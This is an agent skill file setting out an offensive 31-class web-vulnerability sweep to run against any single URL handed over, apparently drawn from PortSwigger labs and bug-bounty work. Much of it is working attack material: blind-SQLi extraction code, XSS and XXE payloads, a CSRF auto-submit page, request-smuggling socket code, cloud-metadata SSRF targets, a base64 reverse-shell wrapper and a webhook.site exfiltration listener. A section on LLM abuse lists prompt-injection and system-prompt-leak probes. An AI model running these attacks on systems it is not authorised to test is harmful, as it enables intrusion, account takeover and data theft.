---
name: web-vuln-class-sweep
sources: portswigger_academy, original_research
description: Systematic 31-class web vulnerability sweep. Given ONE URL/target, drive every major web attack class to a confirmed finding — SQLi, XSS, CSRF, SSRF, request smuggling, cache poisoning/deception, auth bypass, access control/IDOR, business logic, race conditions, deserialization, prototype pollution, XXE, SSTI, OS command injection, path traversal, file upload, JWT, OAuth, SAML, host header, CORS, clickjacking, DOM clobbering, WebSockets, GraphQL, NoSQLi, API/BOLA/mass-assignment, information disclosure, LLM/AI abuse. Use when hunting a web target and you must not miss a class, when building/improving an automated web hunter, or when a URL is handed to you and "try everything" is the instruction.
---

# Web vulnerability class sweep

One URL in. Every class attempted. Only confirmed findings out.

This skill exists because a bug-bounty finder that only tests the classes it "feels like"
misses whole categories. Treat the class list as a **checklist with a completion gate**:
a class is not done until you either have a confirmed finding or a recorded reason it is
not exploitable on this target.

---

## 0. The two laws

1. **No probe without a confirmation gate.** Every class below names what "confirmed"
   means. A reflected string is not XSS; a 500 is not SQLi; an `Access-Control-Allow-Origin`
   header is not a CORS finding. Prove impact or drop it.
2. **Unreached ≠ untested.** If a class was skipped, say so and why. Silence is a bug.

---

## 1. Sweep loop

```
A. Fingerprint + surface map
B. Class probes  (section 4, one pass per class)
C. Confirm + escalate each candidate to real impact
D. Record: CONFIRMED / NOT-EXPLOITABLE(reason) / UNREACHED(reason)
```

### A. Surface map (never skip — most classes die here if you do)

- Crawl + `robots.txt`, `sitemap.xml`, `/.well-known/`, `/api`, `/graphql`, `/actuator`,
  `/debug`, `/swagger.json`, `/openapi.json`, `/.git/config`, `/server-status`.
- **Read the JavaScript bundles.** SPA route maps, hidden endpoints, feature flags and
  hardcoded keys live there. Grep for `/api/`, `fetch(`, `axios`, `token`, `key`, `secret`.
- Enumerate parameters per endpoint (query, body, JSON keys, headers, cookies).
  Hidden-parameter discovery pays for itself: try `arjun`-style key spraying on JSON/query
  endpoints (`role`, `isAdmin`, `debug`, `test`, `admin`, `internal`, `format`, `callback`).
- Record the **cache layer** (CDN headers `Age`, `X-Cache`, `CF-Cache-Status`, `Via`) —
  it changes which classes are live (cache poisoning/deception).

---

## 2. Shared infrastructure (build these once; every class reuses them)

### 2.1 Out-of-band listener (replaces Burp Collaborator)

Blind SSRF / XXE / SQLi / OS command injection / XSS exfil all need an external endpoint
that records interactions.

```python
import requests, time
t = requests.post('https://webhook.site/token', json={'default_status': 200, 'default_content': 'ok'}).json()
uid, host = t['uuid'], t['uuid'] + '.webhook.site'
# put host in the payload, then poll:
requests.get(f'https://webhook.site/token/{uid}/requests', params={'sorting':'newest'}).json()['data']
```

Use it for: OOB SSRF, blind XXE (external DTD + parameter entity), blind OS command
injection (`nslookup $(whoami).<host>`), blind SQLi, dangling-markup XSS capture,
CSRF-token exfil, WebSocket-hijack exfil.

**Gate:** a class that needs OOB is *not tested* until the listener has actually recorded
an interaction. Absence of a hit with an untested listener is not a clean result.

### 2.2 Victim / exploit host

For CSRF, clickjacking, stored XSS, CORS, cache deception, dangling markup, LLM indirect
injection you need a page the victim loads. Host it anywhere (lab exploit server, S3,
nginx), then serve an auto-submitting page:

```html
<form action="https://TARGET/change-email" method="POST" id=f>
  <input name="email" value="attacker@evil">
</form><script>document.forms[0].submit()</script>
```

### 2.3 Raw-socket layer (required for smuggling, CL.0, H2)

`requests` normalises away exactly the bytes these classes need.

```python
import socket, ssl
def raw(host, payload: bytes, port=443, timeout=10):
    s = socket.create_connection((host, port), timeout=timeout)
    s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
    s.sendall(payload)
    out = b''
    try:
        while True:
            b = s.recv(65535)
            if not b: break
            out += b
    except socket.timeout:
        pass
    return out
```

Build the request **verbatim**, including conflicting `Content-Length` and
`Transfer-Encoding`, and keep `Connection: keep-alive` so the smuggled prefix lands on the
next request on the same socket.

### 2.4 Blind oracle with binary search

Blind boolean/time/error SQLi and blind command output need character extraction.
Never linear-scan a charset — binary search halves it:

```python
def extract(cond, maxlen=40, charset=None):
    # cond(payload_fragment) -> bool
    out = ''
    for i in range(1, maxlen+1):
        lo, hi = 32, 126
        while lo < hi:                       # binary search on the code point
            mid = (lo+hi)//2
            if cond(f"ASCII(SUBSTRING(({q}),{i},1))>{mid}"): lo = mid+1
            else: hi = mid
        if lo <= 32 or lo > 126: break
        out += chr(lo)
    return out
```

Parallelise with a thread pool (10–20 workers) — the oracle is network-bound.

### 2.5 HTTP parsing gotchas that silently break probes

- **Unquoted HTML attributes** are common: `name=csrf value=abc123`. A regex requiring
  quotes extracts nothing, the request goes out without a CSRF token, and you wrongly
  conclude "login/CSRF works". Always accept `"`, `'`, and bare values.
- **Redirect bodies**: leaks frequently live in the body of a `302`. Use
  `allow_redirects=False` or you will follow the redirect and lose the evidence.
- **CSRF tokens are per-session** — re-read after a cookie/session change.
- Compare responses on **body length, status, and a stable extracted substring** — not on
  raw length alone (timestamps/nonces make it noisy).

---

## 3. Class playbooks

Each entry: **Signals → Probes → Confirmed when → Escalate**.

### SQL injection
- Signals: numeric/string params feeding filters, search, sort, login; DB error pages.
- Probes: `'`, `''`, `'--`, `')--`, `ORDER BY 1..N--`, then `UNION SELECT NULL,...`;
  MySQL comments are `#` or `-- ` (a bare `--` is not a comment); Oracle needs `FROM dual`.
- Confirmed when: a UNION row appears in the response, or a boolean/time oracle flips
  (`AND 1=1` vs `AND 1=2`, `pg_sleep(5)` vs `pg_sleep(0)`), or an OOB DNS hit fires.
- Escalate: dump `information_schema.tables` (MySQL/MSSQL) / `all_tables` (Oracle) →
  `users` → credentials; log in as admin, or read files via `LOAD_FILE`/`xp_cmdshell`.
- **Blind**: build the oracle first (2.4). Time-based needs a baseline — measure the delay,
  do not assume a fixed `SLEEP` value.

### Cross-site scripting
- Signals: input reflected into HTML, attributes, JS strings, or a JS sink
  (`innerHTML`, `document.write`, `eval`, `location`); stored in comments/profiles.
- Probes: polyglot first — `"><svg/onload=alert(1)>`, `'><img src=x onerror=alert(1)>`,
  `${7*7}` for templates; DOM sinks via `#fragment` and `postMessage`.
- Confirmed when: script executes in a **real browser** (use Playwright; capture
  `dialog` event), not when a string is reflected.
- Escalate: session/`document.cookie` theft to an OOB endpoint; stored XSS → admin bot;
  CSP bypass via `script-src-elem`, JSONP allowlists, nonce reuse, or a `report-uri`/
  `token` param you can inject directives into; dangling markup to steal a CSRF token.

### CSRF
- Signals: state-changing request authenticated **only** by cookies; no token, or a token
  that is not actually validated.
- Probes: remove the token; change method (`GET`↔`POST`); swap the token between two
  sessions; send a token from another account; `SameSite` bypass via `_method`/top-level
  GET; omit `Origin`/`Referer`.
- Confirmed when: the action succeeds from a **cross-site page** with the victim's cookies.
- Escalate: email change → password reset → account takeover.

### SSRF
- Signals: any URL/host/webhook/import/preview/image-fetch/PDF-render parameter.
- Probes: your OOB host; `http://127.0.0.1:PORT/`, `http://[::1]/`, decimal/hex/octal IP
  encodings, `localhost`, `ATTACKER@TARGET`, redirect chains, `#`/`?` truncation.
- Confirmed when: the server fetches your listener, **or** a distinct response proves an
  internal fetch (status/length/timing delta).
- Escalate: cloud metadata
  (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
  `http://metadata.google.internal/computeMetadata/v1/`), internal admin APIs, `gopher://`
  → Redis → RCE.

### Request smuggling
- Signals: front-end proxy/CDN/LB in front of an origin; HTTP/1.1 keep-alive.
- Probes: raw sockets only. CL.TE, TE.CL, TE.TE (obfuscate `Transfer-Encoding`:
  `xchunked`, tab-prefixed, duplicate headers), CL.0, H2.CL / H2.TE after a downgrade.
- Confirmed when: a subsequent request on the same connection receives the *smuggled*
  response, or a timing anomaly is reproducible.
- **A follow-up request is usually mandatory.** With pause-based / early-response desync
  the front-end *withholds* the back-end's early 302 while it still waits for the outer
  body; the smuggled response only surfaces on the connection queue to the **next**
  request. A solver that sends the payload and waits will see nothing and wrongly
  conclude "not vulnerable".
- **Exact byte lengths matter, and they are measured, not guessed.** The weaponising
  `Content-Length` must equal `len(smuggled_request)` or the front-end truncates it and
  the smuggled request 400s — a widely-copied writeup value (e.g. `123`) is often wrong
  on a different build. Likewise a capture length must be tuned to where the victim's
  `Cookie` header actually falls in their request; sweep a small range rather than
  fixing one number.
- **Trailing slashes change which handler runs** (`/admin/delete/` vs `/admin/delete`):
  without it the server issues a redirect and the intended handler never executes.
- Escalate: bypass front-end auth/ACL, poison the cache, capture another user's request.

### Web cache poisoning / deception
- Signals: `Age`, `X-Cache`, `CF-Cache-Status`, `Via`; CDN in front.
- Probes (poisoning): unkeyed inputs — `X-Forwarded-Host`, `X-Forwarded-Scheme`,
  `X-Host`, `X-Forwarded-Server`, `X-Original-URL`, cookies, and fat `GET` bodies. Always
  send a **cache-buster** on the poisoning request and fetch the **clean** URL to verify.
- **Read the cache key instead of guessing it.** Many caches expose it (one returns it
  for `Pragma: x-get-cache-key`). The key often literally embeds the pieces you can
  influence — e.g. `<path with utm_content stripped>$$origin=<Origin header>` — and
  `$$` is a real separator, not a placeholder.
- **Normalisation: poison raw, deliver encoded.** A cache that URL-*decodes* the request
  target when building its key will store the response for the *encoded* URL when you
  send the *raw* path. Send `GET /x</p><script>alert(1)</script>` and deliver
  `/x%3C/p%3E%3Cscript%3Ealert(1)%3C/script%3E`. If you send the encoded form to poison,
  it keys differently and nothing is poisoned.
- **A shared key defeats a single attempt.** If the poisoned entry and the benign
  backend entry map to the *same* key, a pre-existing benign entry answers your poison
  request with a HIT and your payload never reaches the cache. Loop both requests for
  longer than the entry TTL (the labs needed ~15 iterations over ~4 minutes), and
  re-poison + re-deliver in a tight loop on short `max-age` responses.
- **Internal vs external caches.** Poisoning the *internal* fragment may require a
  cache-busted query on the first request, then a *plain* request (no injection header)
  so the external cache re-renders from the poisoned fragment. Order matters.
- Probes (deception): append a static-looking suffix to a private page
  (`/my-account/x.css`, `%2f`, `;`, `.js`, encoded `?`) and re-request unauthenticated.
- Confirmed when: the poisoned response is served to a *different* request, or a private
  page is retrievable without credentials.
- Escalate: persistent XSS to every visitor; token/API-key/PII theft.

### Reading an exfil log without clearing it
If the listener has **no clear-log route**, rows accumulate across every run and a stale
hit from an earlier test will be mistaken for this run's. Tag every exfil with a fresh
random marker (`/collect/<rand>?d=<data>`) and accept only rows carrying that marker.
Beware characters the sink re-encodes: a value interpolated into a URL query must not
contain `&`.

### Authentication
- Signals: login, MFA, password reset, "stay logged in", password change.
- Probes: username enumeration (message / status / **timing** / lockout differences);
  brute force with the official wordlists; `X-Forwarded-For` to defeat IP throttling;
  reset-token predictability and reuse; host-header poisoning of the reset link;
  MFA bypass by navigating straight to the post-auth page; MFA `verify`-style parameters
  that name the account; JSON bodies that accept **an array** of passwords in one request.
- Confirmed when: you are authenticated as another user, or the reset/MFA control is
  provably bypassed.
- Escalate: ATO; then re-run every authenticated class as the victim.

### Access control / IDOR / BOLA
- Signals: object ids in path/query/body, `/my-account?id=`, `userId`, `roleid`, admin
  panels, multi-tenant headers.
- Probes: swap the id for another user's; set `roleid`/`role`/`isAdmin` in an update body;
  method tampering (`GET` vs `POST`); `X-Original-URL` / `X-Rewrite-URL`; `Referer`-based
  checks; skip a step in a multi-step flow and replay the final confirm request.
- Confirmed when: you read/modify another user's data or reach a privileged function.
- Escalate: admin takeover, mass data extraction, delete/transfer actions.

### Business logic
- Signals: money, quantity, discounts, coupons, refunds, quotas, multi-step workflows.
- Probes: negative/zero/huge quantities; coupon stacking; currency confusion; skip or
  replay workflow steps; parameter pollution; price/total fields in the request.
- **Integer overflow on running totals.** A cart/balance/quantity held as a signed
  32-bit integer wraps. Do the arithmetic instead of guessing: to land the total at `T`
  inside a target window, add the expensive item until the running total is the largest
  multiple of its price below `2**32`, then `ceil(shortfall / cheapest_price)` of the
  cheapest item — the total lands below the cheapest price, so it is inside the window
  by construction. The naive `(2**31 - total)//price + 1` lands near `-2**31` and would
  need millions of filler units.
- **Steer on the value the SERVER reports, not on your local arithmetic.** The two drift
  (capped quantities are silently dropped, reconnects reset the session), and a solver
  that trusts its own running total will walk confidently in the wrong direction for
  thirty minutes. Read the total back each pass and fail fast if a pass changes nothing.
- **Check where a value actually lives before parsing it.** A page's first `$x.xx` is
  usually the store-credit header, not the item price; target the price element.
- **A discount applied to the whole ORDER compounds.** If a coupon is per-order rather
  than per-item, buying the maximum affordable quantity turns each cycle into a
  multiplier (~1.4x/round) rather than an additive `$3` — the difference between 7
  cycles and 400.
- Confirmed when: you obtain value you should not (free goods, extra credit, bypassed limit).

### Race conditions
- Signals: "limit once" semantics — coupon, gift card, vote, withdraw, OTP attempts,
  registration uniqueness.
- Probes: single-packet attack over HTTP/2 (hold the final byte of each request, release
  together); if you cannot build H2, fire N simultaneous requests from a thread pool
  barrier. Repeat 10–50×; races are probabilistic.
- Confirmed when: the limit is exceeded / two actions both succeed.
- Escalate: double-spend, duplicate redemption, OTP brute force, limit-overrun.

### Deserialization
- Signals: base64/opaque blobs in cookies/params; `rO0`, `O:8:`, `__VIEWSTATE`,
  Python pickle, Ruby `Marshal`; a value starting `H4sI` is **base64(gzip(...))** —
  decode `base64 → gunzip` and check for `\xac\xed\x00\x05` (Java) before concluding
  anything. A cookie that only appears *after* a privilege change is the intended next
  stage almost every time — diff the cookie jar on every role transition.
- Probes: tamper a property and observe behaviour change; then a gadget chain for the
  detected stack (Java `ysoserial`, PHP, .NET `BinaryFormatter`, Python `__reduce__`).
  A signature-less blob fails *loudly and specifically* (`java.io.EOFException`,
  `ClassNotFoundException`) — that error is confirmation, not a dead end.
- Confirmed when: the gadget executes (OOB hit / command side-effect).
- Escalate: RCE. `Runtime.exec(String)` has **no shell** — wrap the real script as
  `bash -c {echo,<b64>}|{base64,-d}|{bash,-i}` (brace expansion rebuilds the pipeline)
  and exfil in a URL the OOB listener logs, since POST bodies usually are not logged.

### Prototype pollution
- Signals: Node/JS backends, `Object.assign`/deep-merge/`lodash.merge`, JSON body merges;
  client-side URL/hash → merge → sink.
- Probes: `{"__proto__":{"x":1}}`, `constructor.prototype`, `?__proto__[x]=1`; server-side
  gadget chains (`child_process.execSync`, `transport_url`, `sequence`).
- Confirmed when: a polluted property reaches a sink (XSS/RCE) — verify the sink, not the
  pollution alone.

### XXE
- Signals: XML bodies (SOAP, SAML, `application/xml`), SVG/DOCX/XLSX upload, RSS import.
- Probes: `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`; parameter entities
  `%xxe;`; XInclude (`<xi:include parse="text" href="file:///etc/passwd"/>`); OOB external
  DTD when the response is silent.
- Confirmed when: file content appears in the response, or an OOB interaction fires.
- Escalate: SSRF, internal port scan, file read.

### SSTI
- Signals: user input rendered into a template (receipts, emails, "hello {{name}}").
- Probes: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `${{7*7}}`; fuzz string
  `${{<%[%'"}}%\` to fingerprint the engine from the error.
- Confirmed when: the arithmetic evaluates server-side (7*7 → 49).
- Escalate: engine-specific RCE (Jinja2 class-walk, Freemarker `?new()`/`Execute`, Twig,
  Handlebars constructor chain, ERB `system()`).

### OS command injection
- Signals: anything shelling out — ping/traceroute, image conversion, archive, PDF, DNS.
- Probes: `;id`, `|id`, `||id`, `` `id` ``, `$(id)`, `%0aid`, newline injection, argument
  injection (`-o` flags, `--use-command`).
- Confirmed when: command output appears, a time delay is reproducible, or an OOB DNS/HTTP
  hit fires.
- Escalate: reverse shell, file write into the webroot, credential read.

### Path traversal / LFI
- Signals: filenames in params (`?file=`, `?page=`, `?download=`, `?template=`), image
  loaders, static handlers.
- Probes: `../../../../etc/passwd`, absolute paths, `....//`, `%252e%252e%252f`,
  unicode/`..%2f`, null-byte suffixes, start-of-path variants.
- Confirmed when: file content is returned.
- Escalate: `/etc/shadow`, app config, source, log poisoning → RCE, PHP wrappers.

### File upload
- Signals: avatars, attachments, imports, document processors.
- Probes: extension double/alternate (`.php.jpg`, `.phtml`, `.pHp`), content-type and magic
  bytes, `.htaccess`/`web.config` upload, filename traversal (`../x.php`), SVG (XSS/XXE),
  ZIP slip, polyglots.
- Confirmed when: the uploaded file executes or is rendered as active content.
- Escalate: webshell RCE, stored XSS to the admin bot.

### JWT
- Signals: `eyJ...` bearer/cookie tokens, `alg`, `kid`, `jku`, `x5u`, `/jwks.json`.
- Probes: `alg:none`; HS256 signed with the **public key** as the HMAC secret (RS256→HS256
  confusion); brute-force the secret with the target wordlist; `kid` path traversal
  (`../../../../dev/null`) and `kid` SQLi; `jku`/`x5u` pointing at a JWKS you host.
- Confirmed when: a forged token is accepted (privileged page loads).
- Escalate: forge `admin`/`sub` claims → admin actions; `jwk` header injection.

### OAuth / OIDC
- Signals: `redirect_uri`, `state`, `code`, `/authorize`, `/callback`, "Login with X".
- Probes: redirect_uri tampering (path append, subdomain, `@`, `#`, open redirect in the
  allowlist), missing/ignored `state`, implicit-flow token leak via fragment, pre-account
  linking CSRF, `response_mode` abuse, scope escalation.
- Confirmed when: you receive the victim's code/token, or link/impersonate their account.

### SAML
- Signals: `SAMLResponse` base64 in a POST, `/saml/acs`, IdP/SP metadata.
- Probes: signature stripping, XML signature wrapping (relocate the signed element),
  comment injection in NameID, audience restriction omission, assertion replay.
- Confirmed when: an assertion without a valid signature is accepted.

### Host header
- Signals: password reset links, absolute URLs in emails, routing/vhosts, cache in front.
- Probes: `Host: attacker`, `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`,
  duplicate `Host`, absolute-form request line, dangling-markup of the host.
- **The edge often routes on `Host` before the app sees anything.** A request whose
  `Host` names a different vhost (or your own callback host) may be delivered to that
  upstream instead of the app — so a spoofed-`Host` test that "does nothing" has often
  not reached the target at all. Send an authenticated request (with a real session
  cookie) alongside the spoofed header, and try duplicate `Host` headers over a raw
  socket: front-ends vary between rejecting them (`400 Duplicate header names…`) and
  honouring the second value. Test both anonymous and authenticated; the routing
  decision frequently differs.
- Confirmed when: the generated link/token points at your domain (and you capture the
  victim's reset token), or routing/SSRF changes.

### CORS
- Signals: `Access-Control-Allow-Origin` reflected, `Allow-Credentials: true`, API responses
  with user data.
- Probes: `Origin: https://attacker`, `Origin: null`, `Origin: https://TARGET.evil`,
  `Origin: https://evil.TARGET`, unescaped-dot regex bypass, preflight gating.
- Confirmed when: a **browser** cross-origin credentialed read returns the victim's data
  (prove it in a real browser page, not with curl).

### Clickjacking
- Signals: state-changing pages, absent `X-Frame-Options` / `frame-ancestors`.
- Probes: frame it; overlay a decoy with `opacity`/`z-index`; prefill via URL params.
- Confirmed when: the framed page renders **and** the click lands on the real control
  (same-site cookies and JS framebusting can defeat it — test, don't assume).

### DOM-based / DOM clobbering
- Signals: `location`/`postMessage`/`document.cookie` read into `innerHTML`, `eval`,
  `location.href`; HTML-injection sinks inside a sanitizer allowlist.
- Probes: read the JS, find the source→sink path; `postMessage` without origin checks;
  `javascript:` URLs; clobbering via `<form id=x><input name=attributes>` /
  `<a id=x><a id=x name=y>`.
- Confirmed when: `alert`/`print` fires in a real Chrome browser.

### WebSockets
- Signals: `ws://`/`wss://`, Socket.IO, live chat/notifications.
- Probes: missing `Origin` check on the handshake (CSWSH); message tampering (client-side
  HTML-encoding is not server-side sanitisation); handshake header spoofing
  (`X-Forwarded-For` after an IP ban); per-message authz.
- Confirmed when: you receive another user's stream, or an injected message executes in a
  victim's browser.
- Note: `websockets`/`websocket-client` may be absent — a minimal RFC6455 client
  (handshake + masked frames) is ~80 lines and worth writing once.

### GraphQL
- Signals: `/graphql`, `/graphiql`, `{"query":`, Apollo/Hasura.
- Probes: introspection; `node(id:)` / relay global-id IDOR; mutations missing authz;
  field-suggestion when introspection is off; alias batching for rate-limit bypass;
  depth/alias DoS.
- Confirmed when: another user's data returns, or an admin mutation succeeds.

### NoSQL injection
- Signals: MongoDB/Mongoose, JSON bodies, `$where`, login with JSON.
- Probes: `{"username":{"$ne":null},"password":{"$ne":null}}`, `$regex`, `$gt`, `$where`
  JS, array coercion, operator injection in query strings (`user[$ne]=x`).
- Confirmed when: auth bypass or data extraction succeeds.

### API testing / mass assignment / BFLA
- Signals: REST/JSON APIs, versioned paths, mobile backends, OpenAPI/Swagger.
- Probes: enumerate versions (`/v1`, `/v2`, `/beta`, `/internal`); compare documented vs
  live inventory; invent ids (BOLA); add privileged fields to bodies (`role`, `isAdmin`,
  `balance`, `verified`); change HTTP method (`GET`→`PUT`/`PATCH`/`DELETE`) to reach
  privileged functions; server-side parameter pollution (`?name=x%26role=admin`).
- Confirmed when: elevated state or another tenant's data.
- Documentation drift is a first-class finding: shadow/zombie versions often miss the fix.

### Information disclosure
- Signals: verbose errors, debug pages, source maps, backups, `.git`, stack traces.
- Probes: `/.git/config`, `/backup`, `/js/*.js.map`, `/actuator/env|heapdump|configprops`,
  TRACE method, malformed types to trigger a framework error page, build/asset manifests.
- Confirmed when: a secret, credential, or internal structure is exposed.

### LLM / AI abuse
- Signals: chat endpoints, "ask AI", summarisation of user content, tool/function calling,
  RAG over user-supplied docs.
- Probes: direct prompt injection ("ignore previous instructions…"), **indirect** injection
  via content the model will read (reviews, tickets, files, web pages), output-handling
  sinks (model output rendered as HTML → XSS), excessive agency (model has tools that
  delete/mail/fetch), system-prompt leakage, training-data/PII extraction.
- Confirmed when: restricted output is produced, a tool is invoked with attacker args, or
  injected content executes downstream.

### Essential skills — encoding & obfuscation
- Signals: filters/WAFs blocking obvious payloads.
- Probes: URL/double-URL/HTML-entity/unicode encoding; case mixing; comment insertion
  (`/**/`, `/**/` in place of spaces); `%0a`/`%09`; concatenation; `String.fromCharCode`;
  alternate tags (`<svg>`, `<details>`, `<marquee>`); null bytes.
- Use when a payload *should* work and does not — the filter is the finding's gate, not its
  killer.

---

## 4. Anti-patterns (these produce the false positives that kill a hunter's credibility)

| Claim | Why it is wrong | What to do instead |
|---|---|---|
| "SQLi — I got a 500 on `'`" | A 500 is not injection | Show a UNION row, a boolean/time oracle, or OOB |
| "XSS — the payload is reflected" | Reflection ≠ execution | Execute in a real browser, capture the dialog |
| "CORS — ACAO reflects Origin" | Reflection without a credentialed read is noise | Prove a browser cross-origin credentialed read |
| "Open redirect" alone | Usually N/A or low | Chain it (OAuth `redirect_uri`, SSRF filter bypass) |
| "CSRF — no token" | SameSite may block it | Perform the action cross-site with a victim session |
| "SSRF — I got a connection error" | An error is not a fetch | OOB listener hit, or a distinct internal response |
| "Rate limit missing" | Often out of scope / informational | Tie it to a concrete brute-force outcome |
| "Deserialization — I see base64" | Encoding is not a gadget | Execute a chain, observe the side effect |

---

## 5. Driving it automatically

Keep the sweep in a harness rather than in your head, so coverage is measurable:

- `surface.json` — endpoints, params, methods, auth state, cache layer.
- `classes.json` — one row per class: `status` ∈ {confirmed, not-exploitable, unreached},
  `evidence`, `reason`.
- A runner that, per endpoint, iterates the classes that apply and records the row.
- **The completion gate:** the sweep is done only when `classes.json` has no `unreached`
  rows for in-scope endpoints.

Reference implementation built while writing this skill:
`/home/logic/Work/portswigger/` — `pslib.py` (HTTP + exploit-host + instance driver),
`oob.py` (webhook.site listener), `solvers/` (31-class solvers that were each verified
against a real target and only marked solved when the target confirmed it), `solve.py`
(the runner that refuses to count an unverified result).

---

## 6. Verify the DENOMINATOR, not just the numerator

The most expensive failure in this whole methodology is not a missed payload — it is a
coverage report that is **true of the wrong universe**.

Real example that produced a false 100%: the lab catalogue was built with
`<a href="(\S+)">\s*([^<]+?)\s*</a>`. Any entry whose anchor spanned markup failed to
match and was **dropped silently**. 8 of 273 entries vanished; 3 of them were unsolved,
never scheduled, never tested — and every report afterwards said "all solved", because
the tool cannot report on a row it never created. The bug surfaced only by counting the
raw source of truth (273 `container` blocks) against the parsed total (265).

This generalises directly to a real engagement:

- A **scope list** that drops assets on parse → you report full coverage of a subset.
- A **crawler** that fails on a route → that endpoint is never in the surface map.
- An **ASM/inventory export** that silently truncates → entire subsidiaries are absent.

Rules that follow:

1. **Count the raw source and compare it to your parsed set.** Different numbers is a
   bug in the parser, not a fact about the target. Nothing downstream is trustworthy
   until they agree.
2. **A class/asset that is absent from your model is worse than one that failed** — a
   failure is visible, an absence looks like success.
3. **Make the pipeline able to say "unreached".** Every asset × class cell should be
   `confirmed` / `not-exploitable(reason)` / `unreached(reason)`. "Absent" must never be
   a legal state.
4. **Be suspicious of a clean sweep.** 100% coverage on the first pass usually means the
   denominator shrank, not that the target is clean.

## 7. The one-line version

Map the surface → for each class run the probe → **prove impact or record why not** →
never let a class be silently skipped.
